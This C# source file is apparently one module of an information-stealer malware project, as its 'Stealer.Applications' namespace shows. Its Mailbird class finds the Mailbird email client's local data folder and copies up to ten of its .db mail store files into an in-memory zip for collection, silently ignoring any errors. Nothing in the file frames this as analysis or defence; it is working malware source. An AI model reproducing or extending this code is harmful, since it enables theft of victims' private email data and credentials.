using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Mailbird : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mailbird");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Mailbird";

            bool foundData = false;

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string storePath = Path.Combine(basePath, "Store");
                if (Directory.Exists(storePath))
                {
                    string[] dbFiles = Directory.GetFiles(storePath, "*.db", SearchOption.AllDirectories);
                    
                    foreach (string file in dbFiles.Take(10))
                    {
                        string relativePath = file.Substring(storePath.Length + 1);
                        string zipPath = $"Applications\\Mailbird\\{location}\\Store\\{relativePath.Replace("\\", "/")}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
